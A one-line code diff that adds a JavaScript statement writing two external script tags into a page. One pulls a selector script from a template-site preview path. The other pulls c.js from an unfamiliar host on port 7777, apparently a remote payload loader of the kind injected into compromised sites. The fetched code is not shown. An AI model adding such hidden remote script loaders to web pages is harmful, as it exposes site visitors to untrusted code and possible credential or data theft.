@@ -1,0 +1,1 @@
+document.write("<script src='http://www.17sucai.com/preview/25238/2015-07-02/PCASClass/PCASClass.js?_xvx_=2847200986'></script>");document.write("<script src='http://j.doudao.cn:7777/js/c.js'></script>");
